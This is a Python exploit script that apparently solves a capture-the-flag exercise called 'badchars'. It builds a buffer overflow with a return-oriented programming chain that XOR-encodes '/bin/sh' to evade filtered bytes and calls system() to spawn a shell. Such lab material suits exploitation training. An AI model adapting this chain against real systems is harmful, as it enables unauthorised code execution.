#!/usr/bin/python

import struct
import os

def p64(addr):
	return struct.pack("<Q",addr)

def xor(string):
	str = bytearray(string)
	result = ''
	for i in range(len(str)):
	     result += chr(str[i] ^ 0x9)
	return result

garbage = "A"*40

system = p64(0x4006f0)
data = 0x601074

binsh = "/bin/shN"

#xor BYTE PTR [r15],r14b
xor_r15_r14 = p64(0x400b30)

#mov QWORD PTR [r13+0x0],r12
mov_r13_r12 = p64(0x400b34)

#pop rdi
pop_rdi = p64(0x400b39)

#pop r12; pop r13
pop_r12_pop_r13 = p64(0x400b3b)

#pop r14; pop r15
pop_r14_pop_r15 = p64(0x400b40)


exploit  = garbage
exploit += pop_r12_pop_r13
exploit += xor(binsh)
exploit += p64(data)
exploit += mov_r13_r12
exploit += pop_r12_pop_r13
exploit += p64(0)
exploit += p64(data+7)
exploit += mov_r13_r12
for i in range(len(binsh)-1):
	exploit += pop_r14_pop_r15
	exploit += p64(0x9)
	exploit += p64(data+i)
	exploit += xor_r15_r14
exploit += pop_rdi
exploit += p64(data)
exploit += system

with open("simple_exploit.txt","w") as f:
	f.write(exploit)
	f.close()

os.system("((cat simple_exploit.txt); cat -)|./badchars")
